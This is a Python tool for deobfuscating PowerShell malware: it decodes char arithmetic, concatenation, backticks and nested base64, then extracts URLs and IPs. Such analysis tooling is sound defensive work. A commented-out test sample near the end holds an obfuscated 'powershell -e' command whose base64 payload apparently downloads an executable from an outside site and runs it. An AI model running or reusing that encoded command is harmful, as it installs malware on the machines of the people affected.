import re
import base64
from urllib.parse import unquote
import os
os.system('clear')

def remove_string(code):
    pattern = re.compile(r'\[string\]', re.IGNORECASE)
    newcode = []
    for line in code.strip().splitlines():
        newcoderes = pattern.sub('', line).strip()
        newcode.append(newcoderes)
    return "\n".join(newcode)

def remove_space_from_char(code):
    code = re.compile(r'(\[ChaR\])\s*\(', re.IGNORECASE).sub(r'\1(', code)
    code = re.compile(r'(\[Char\])\s*(\d+)', re.IGNORECASE).sub(r'\1(\2)', code)
    return code

def change_bxor_and_to_chr(code):
    def replace_bxor_and_to_chr(match):
        res = match.group(1)
        changebxor = res.replace('-bxor', '^')
        return f'Chr({changebxor})'
    
    return re.compile(r'\[char\]\(([\d\-+\*/\s]+(?:\s?-bxor\s?[\d\-+\*/\s]+)*)\)', re.IGNORECASE).sub(replace_bxor_and_to_chr, code)
 
def decode_chr(expr):
    numbers = list(map(int, re.findall(r'-?\d+', expr)))
    symbol = re.compile(r'\d+\s*(\^|\+|\-|\/|\*{1,2}|\%|\^)', re.IGNORECASE).findall(expr)

    numlist = []
    oprlist = []

    def operator(opr, a, b):
        if opr == '+': return a + b
        elif opr == '-': return a - b
        elif opr == '*': return a * b
        elif opr == '/': return a // b
        elif opr == '%': return a % b
        elif opr == '^': return a ^ b
        elif opr == '**': return a ** b
    
    precedence = {'+': 1, '-': 1, '*': 2, '/': 2, '%': 2, '^': 2, '**': 2}
    for number, symbol in zip(numbers[:-1], symbol):
        numlist.append(number)
        while oprlist and (precedence[symbol] <= precedence[oprlist[-1]]):
            b = numlist.pop()
            a = numlist.pop()
            op = oprlist.pop()
            numlist.append(operator(op, a, b))
        oprlist.append(symbol)
    numlist.append(numbers[-1])

    while len(numlist) > 1:
        b = numlist.pop()
        a = numlist.pop()
        op = oprlist.pop()
        numlist.append(operator(op, a, b))

    return chr(numlist[0])

def validate_input(input_string):
    input_string = input_string.strip()
    while re.search(r'(\w)\s*\+\s*(\w)', input_string):
        input_string = re.sub(r'(\w)\s*\+\s*(\w)', r'\1\2', input_string)
    input_string = re.sub(r'\s*\+\s*', '', input_string)
    return input_string

def check_concat_plus(symbol):
    chr_pattern = re.compile(r'chr\([^()]*\)', re.IGNORECASE)
    chr_substrings = chr_pattern.findall(symbol)
    temp_string = chr_pattern.sub("temp", symbol)
    
    temp_string = validate_input(temp_string)
    
    for chr_substring in chr_substrings:
        temp_string = temp_string.replace("temp", chr_substring, 1)
    return ' ' + temp_string


def concat_code(code):
    concatregex = re.compile(r'(Chr\([^()]*\))(\s*\+\s*(Chr\([^()]*\)))*', re.IGNORECASE)
    
    matches = concatregex.finditer(code)
    results = []
    for match in matches:
        results.append(match.group(1))
        remaining_text = match.group(0)[len(match.group(1)):].strip()
        while remaining_text:
            chr_match_after_plus = re.match(r'\s*\+\s*(Chr\([^()]*\))', remaining_text, re.IGNORECASE)
            if chr_match_after_plus:
                results.append(chr_match_after_plus.group(1))
                remaining_text = remaining_text[chr_match_after_plus.end():].strip()
            else:
                break
    gabungin = [decode_chr(result) for result in results]
    splitslashn = [splitslash for splitslash in code.strip().splitlines()]
    check = []
    for i in splitslashn:
        check.append(i + '\n')
    newcoderes = []
    for i in range(len(check)):
        check[i] = check[i]
        if "+=" in check[i]:
            parts = [part.lstrip(' ') for part in check[i].split('+=')]
            if "+" in parts[1] and not re.search(r'\$\w+', parts[1]):
                newparts = check_concat_plus(parts[1])
            else:
                newparts = parts[1]
            check[i] = parts[0] + "+=" + ' ' + newparts + "\n"
            newcoderes.append(check[i])
        elif "=" in check[i]:
            valid = 0
            parts = [part.lstrip(' ') for part in check[i].split('=')]  
            for j in range(len(parts)):
                if "+" in parts[j] and (re.search(r'\$\w+', parts[j]) or 'replace' in check[i].lower()):
                    newcoderes.append(check[i])
                    valid = 1
                    break
            if valid == 0:
                pluscount = 0
                res = ''
                for i in range(len(parts)):
                    if '+' in parts[i]:
                        newparts = check_concat_plus(parts[i])
                        pluscount = 1
                    else:
                        newparts = parts[i]
                    if pluscount == 0 and i == len(parts) - 1:
                        res += ' '
                    if i == len(parts) - 1:
                        res += newparts + '\n'
                    else:
                        res += newparts + '='
                newcoderes.append(res)
        else:
            if '+' in check[i]:
                check[i] = check_concat_plus(check[i])
            if '\n' not in check[i]:
                check[i] += '\n'
            newcoderes.append(check[i])
    newcode = ''.join([i for i in newcoderes])
    for i, element in enumerate(gabungin):
        if len(element) == 1:
            newcode = newcode.replace(results[i], element)
    return newcode


def backtick(code):
    backtick_dict = {
        '`b': '\b',
        '`f': '\f',
        '`n': '\n',
        '`r': '\r',
        '`t': '\t',
        '`v': '\v'
    }
    checkcode = code.split('\n')
    for i in range(len(checkcode)):
        for backtick, backtickvalue in backtick_dict.items():
            if backtick in checkcode[i]:
                checkcode[i] = checkcode[i].replace(backtick,backtickvalue)
        if not checkcode[i].endswith('\n'):
            checkcode[i] += '\n'
    newcode = ''.join([i for i in checkcode])
    return newcode.strip()


def combine_and_concat_multiple_variables_value(code):
    value_dict = {}
    notvariablevalue = []
    equalmorethan1pattern = r'={2,}'
    plusequalcount = {}
    
    def replace_equal_more_than_1(match):
        return '%3D' * len(match.group(0))
    
    checkcode = [check for check in code.splitlines() if check != '']

    for i in range(len(checkcode)):
        checkcode[i] = re.sub(equalmorethan1pattern, replace_equal_more_than_1, checkcode[i])
        if "+=" in checkcode[i]:
            parts = checkcode[i].split('+=')
            var = parts[0].strip()
            value = parts[1].strip()
            plusequalcount[var] = 0
            if re.search(r'\$\w+', value_dict.get(var, "")) and plusequalcount[var] != 1:
                value_dict[var] = value_dict.get(var, "") + "+" + value
                plusequalcount[var] = 1
            else:
                value_dict[var] = value_dict.get(var, "") + value

        elif "=" in checkcode[i] and "!=" not in checkcode[i]:
            split_equal = checkcode[i].split('=')
            for i in range(len(split_equal)-1, 0, -1):
                var = split_equal[i-1].strip().split()[-1]
                value = split_equal[i].strip().split('=')[0].strip()
                value_dict[var] = value
        else:
            notvariablevalue.append(checkcode[i])
            
    for var, value in list(value_dict.items()):
        if value in value_dict:
            initialvalue = value
            value = value_dict[value]
            value_dict[initialvalue] = value

    for var, value in value_dict.items():
        newvaluetemp = ""
        for match in re.split(r'(\$?\w+)', value):
            if match in value_dict:
                newvaluetemp += value_dict[match]
            else:
                newvaluetemp += match
        value_dict[var] = newvaluetemp

    reverse_value_dict = {}
    for var, value in value_dict.items():
        if value in reverse_value_dict:
            reverse_value_dict[value].append(var)
        else:
            reverse_value_dict[value] = [var]

    codetemp = []
    for value, vars in reverse_value_dict.items():
        if len(vars) > 1:
            codetemp.append(" = ".join(vars) + f" = {value}")
        else:
            codetemp.append(f"{vars[0]} = {value}")
    newcodetemp = []
    j,k = 0, 0
    for i in range(len(checkcode)):
        if k != len(notvariablevalue) and checkcode[i] == notvariablevalue[k]:
            newcodetemp.append(notvariablevalue[k])
            k += 1
        elif j != len(codetemp):
            newcodetemp.append(codetemp[j])
            j += 1
        elif j == len(codetemp):
            if k == len(notvariablevalue):
                break
            newcodetemp.append(notvariablevalue[k])
            k += 1

    variables = {}
    for line in newcodetemp:
        match = re.match(r'^(\$\w+(?:\s*=\s*\$\w+)*\s*)=\s*(.+)', line)
        if match:
            value = match.group(2).strip()
            vars = [v.strip() for v in match.group(1).split('=')]
            prev_var = value
            for var in vars:
                variables[var] = prev_var
                prev_var = var

    def replace_var(match):
        var = match.group(0)
        while var in variables:
            var = variables[var]
        return var
    
    newcode = []
    for line in newcodetemp:
        if not '=' in line.strip():
            line = re.sub(r'\$\w+', replace_var, line)
        newcode.append(line)

    newcodewithslashn = []
    for i in newcode:
        newcodewithslashn.append(i + '\n')
    newcoderes = []
    for i in newcodewithslashn:
        parts = i.split('=')
        res = ''
        for j in parts:
            if '+' in j:
                check = check_concat_plus(j)
                if parts.index(j) == len(parts) - 1:
                    check += '\n'
            else:
                check = j
            res += check
            if "\n" not in j:
                res += "="
        newcoderes.append(res)
    newcoderes[-1] = newcoderes[-1].strip('\n')
    newcode = ''.join([i for i in newcoderes])
    return newcode

## [TWEAK] - NICO
'''
Logic decodenya ada yg ga perlu, stelah gw cek fungsi yg digunain sm powershell utk decode base64 itu cmn frombase64string. Jadi checkernya itu aja.
'''


def decoding(code):
    checkcode = code.split('\n')
    newcoderes = []

    for i in checkcode:
        if i == '':
            continue

        # Handle the 'frombase64string("...")' format first
        match_from_base64 = re.search(r'frombase64string\("([^"]+)"\)', i, re.IGNORECASE)
        if match_from_base64:
            try:
                print(f'Found --> {match_from_base64.group(0)}')

                # Extract the content inside the parentheses and add '==' to handle padding if needed
                content = match_from_base64.group(1) + '=='
                print(f'Extracted text between parentheses: {content}')
                print("[#]")

                get_decode = base64.b64decode(content)
                # Remove any null byte characters from the decoded content
                get_clean = get_decode.replace(b'\x00', b'')

                # Decode the cleaned byte data to UTF-8 while ignoring decoding errors
                plaintext = get_clean.decode("utf-8", errors="ignore")

                # Replace the Base64 string in the original line with the decoded text
                decoded_line = i.replace(match_from_base64.group(0), plaintext)
                newcoderes.append(decoded_line)
                
                print(f'[+] Decode Success')

                # Recursively decode if there's another 'frombase64string' in the decoded text
                while 'frombase64string' in plaintext:
                    print("[!] Recursive decoding detected, processing again...")
                    plaintext = decoding(decoded_line)  # Recursively decode
                    decoded_line = decoded_line.replace(match_from_base64.group(0), plaintext)

                newcoderes[-1] = decoded_line  # Update the last entry in newcoderes

            except Exception as e:
                print(f'Error during decoding: {e}')
                newcoderes.append(i)

        # Handle the '%3D%3D' URL-encoded Base64 strings
        else:
            matchb64 = re.search(r'(?i)([A-Za-z0-9]+%3D%3D)', i)
            if matchb64:
                try:
                    # Decode URL-encoded Base64 string
                    encoded = unquote(matchb64.group(0))
                    decoded = base64.b64decode(encoded)
                    print("[+] STAGE 1:\n")
                    print(decoded)
                    # Remove any null byte characters from the decoded content
                    decoded_clean = re.sub(b'\x00', b'', decoded)

                    print("\n[+] STAGE 2:\n")
                    decoded_str = decoded_clean.decode("utf-8", errors="ignore")

                    # Replace the URL-encoded Base64 string in the original line with the decoded text
                    decoded_line = i.replace(matchb64.group(0), decoded_str)
                    newcoderes.append(decoded_line)

                    # Recursively decode if there's another 'frombase64string' in the decoded text
                    while 'frombase64string' in decoded_str:
                        print("[!] Recursive decoding detected in URL-encoded Base64 content, processing again...")
                        decoded_str = decoding(decoded_line)  # Recursively decode
                        decoded_line = decoded_line.replace(matchb64.group(0), decoded_str)

                    newcoderes[-1] = decoded_line  # Update the last entry in newcoderes

                except Exception as e:
                    print(f'Error during URL-encoded Base64 decoding: {e}')
                    newcoderes.append(i)
            else:
                newcoderes.append(i)

    # Join the processed lines and return the final decoded content
    newcode = ''.join([i + '\n' for i in newcoderes])
    return newcode.strip()

def Replace(code):
    def replace_func(match):
        stringmatch1,stringmatch2,oldword,newword = match.groups()
        if stringmatch1:
            return '"' + stringmatch1.replace(oldword.replace("'","").replace('"',""), newword.replace("'","").replace('"',"")) + '"'
        elif stringmatch2:
            return "'" + stringmatch2.replace(oldword.replace("'","").replace('"',""), newword.replace("'","").replace('"',"")) + "'"
    
    checkcode = code.split('\n')
    for i in range(len(checkcode)):
        while True:
            newcode, count = re.subn(r'(?:"([^"]+)"|\'([^\']+)\')\.replace\(([^,]+),([^)]+)\)', replace_func, checkcode[i], flags=re.IGNORECASE)
            if count == 0:
                break
            checkcode[i] = newcode
    newcode = ''.join([i + '\n' for i in checkcode])
    return newcode.strip().replace("'","").replace('"', "")


def http_and_ip_grep(code):    
    httplist = re.findall(r'https?://[^\s]+', code)
    iplist = re.findall(r'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}(?::[0-9]{1,5})?\b', code)
    
    return list(set(httplist)), list(set(iplist))

def deobfuscate(code):
    try:
        code = remove_string(code)
        code = remove_space_from_char(code)
        code = change_bxor_and_to_chr(code)
        codetemp = []
        checkcode = code.split('\n')
        for i in range(len(checkcode)):
            checkcode[i] += "\n"
            if ';' in checkcode[i]:
                parts = [part.lstrip(' ') for part in checkcode[i].split(';')]
                if parts[-1] == '\n':
                    parts = parts[:-1]
                if len(parts) == 1:
                    codetemp.append(parts[0] + '\n')
                    continue
                for j in parts:
                    if parts.index(j) == len(parts) - 1:
                        codetemp.append(j)
                    else:
                        codetemp.append(j + '\n')
            else:
                codetemp.append(checkcode[i])
        code = ''.join([i if i != codetemp[-1] else i.rstrip('\n') for i in codetemp])
        code = concat_code(code)
        code = backtick(code)
        code = combine_and_concat_multiple_variables_value(code)
        code = Replace(code)
        code = decoding(code)
        httplist,iplist = http_and_ip_grep(code)
    except:
        code = "Something's wrong with the code or input!"
        return code,[],[]
    return code,httplist,iplist

# code = """
# "C:\Windows\System32\cmd.exe" /c p^ow^ER^s^HE^LL -e WwBzAFkAUwB0AGUAbQAuAFQAZQBYAFQALgBFAE4AYwBvAEQASQBOAGcAXQA6ADoAdQBuAEkAQwBvAEQARQAuAGcAZQB0AHMAdAByAEkAbgBHACgAWwBzAHkAcwB0AGUAbQAuAEMATwBOAHYAZQBSAHQAXQA6ADoAZgBSAE8ATQBCAGEAcwBlADYANABzAFQAcgBpAE4ARwAoACIAZABBAEIAeQBBAEgAawBBAGUAdwBCAG0AQQBHADgAQQBjAGcAQQBnAEEAQwBnAEEASgBBAEIAcABBAEQAMABBAE0AUQBBADcAQQBDAEEAQQBKAEEAQgBwAEEAQwBBAEEATABRAEIAcwBBAEcAVQBBAEkAQQBBAHgAQQBEAE0AQQBNAEEAQQB3AEEARABBAEEATwB3AEEAZwBBAEMAUQBBAGEAUQBBAHIAQQBDAHMAQQBLAFEAQQBnAEEASABzAEEASgBBAEIAcABBAEMAdwBBAEkAZwBCAGcAQQBHADQAQQBJAGcAQgA5AEEASAAwAEEAWQB3AEIAaABBAEgAUQBBAFkAdwBCAG8AQQBIAHMAQQBmAFEAQQBnAEEARwBZAEEAZABRAEIAdQBBAEcATQBBAGQAQQBCAHAAQQBHADgAQQBiAGcAQQBnAEEARwBzAEEAYwBRAEIAdABBAEcAVQBBAGEAQQBBAGcAQQBDAGcAQQBJAEEAQQBrAEEASABrAEEAYwBBAEIAbwBBAEcAbwBBAFkAdwBBAGcAQQBDAHcAQQBJAEEAQQBrAEEASABFAEEAYQBBAEIAcwBBAEMAQQBBAEsAUQBBAGcAQQBIAHMAQQBhAFEAQgBOAEEASABBAEEAYgB3AEIAUwBBAEgAUQBBAEwAUQBCAE4AQQBFADgAQQBaAEEAQgBWAEEARQB3AEEAUgBRAEEAZwBBAEcASQBBAGEAUQBCAFUAQQBGAE0AQQBWAEEAQgB5AEEARQBFAEEAVABnAEIAegBBAEUAWQBBAFIAUQBCAHkAQQBEAHMAQQBEAFEAQQBLAEEARgBNAEEAZABBAEIAQgBBAEYASQBBAFYAQQBBAHQAQQBFAEkAQQBhAFEAQgBVAEEASABNAEEAVgBBAEIAUwBBAEcARQBBAGIAZwBCAFQAQQBHAFkAQQBSAFEAQgB5AEEAQwBBAEEATABRAEIAegBBAEcAOABBAGQAUQBCAHkAQQBFAE0AQQBaAFEAQQBnAEEAQwBRAEEAZQBRAEIAdwBBAEcAZwBBAGEAZwBCAGoAQQBDAEEAQQBMAFEAQgBFAEEARwBVAEEAYwB3AEIAVQBBAEcAawBBAGIAZwBCAEIAQQBIAFEAQQBTAFEAQgB2AEEARQA0AEEASQBBAEEAawBBAEgARQBBAGEAQQBCAHMAQQBEAHMAQQBJAEEAQgBKAEEARwA0AEEAZABnAEIAdgBBAEcAcwBBAFoAUQBBAHQAQQBFAGsAQQBkAEEAQgBsAEEARwAwAEEASQBBAEEAawBBAEgARQBBAGEAQQBCAHMAQQBEAHMAQQBmAFEAQQBOAEEAQQBvAEEAZABBAEIAeQBBAEgAawBBAGUAdwBBAGcAQQBDAEEAQQBKAEEAQgBqAEEASABjAEEAZAB3AEIAbwBBAEcAVQBBAFkAZwBBADkAQQBDAFEAQQBaAFEAQgB1AEEASABZAEEATwBnAEIAMABBAEcAVQBBAGIAUQBCAHcAQQBDAHMAQQBKAHcAQgBjAEEASABNAEEAWQB3AEIAMwBBAEgAZwBBAFkAdwBBAHUAQQBHAFUAQQBlAEEAQgBsAEEAQwBjAEEATwB3AEEATgBBAEEAbwBBAGEAdwBCAHgAQQBHADAAQQBaAFEAQgBvAEEAQwBBAEEASgB3AEIAbwBBAEgAUQBBAGQAQQBCAHcAQQBEAG8AQQBMAHcAQQB2AEEARwBjAEEAWgBRAEIAdgBBAEgASQBBAFoAdwBCAGwAQQBIAEEAQQBjAGcAQgBoAEEASABBAEEAWQBRAEIAegBBAEMANABBAFkAdwBCAHYAQQBHADAAQQBMAHcAQgBqAEEARwBVAEEAYgBRAEEAdgBBAEYAWQBBAFYAZwBCAGEAQQBFADAAQQBXAFEAQgBNAEEARQBnAEEAWQBRAEIAVABBAEUAOABBAFkAdwBCAGkAQQBHAHcAQQBjAFEAQgB2AEEAQwA0AEEAWgBRAEIANABBAEcAVQBBAEoAdwBBAGcAQQBDAFEAQQBZAHcAQgAzAEEASABjAEEAYQBBAEIAbABBAEcASQBBAE8AdwBBAE4AQQBBAG8AQQBJAEEAQgA5AEEARwBNAEEAWQBRAEIAMABBAEcATQBBAGEAQQBCADcAQQBIADAAQQAiACkAKQB8AEkAZQBYAA==
# """

# print(deobfuscate(code))
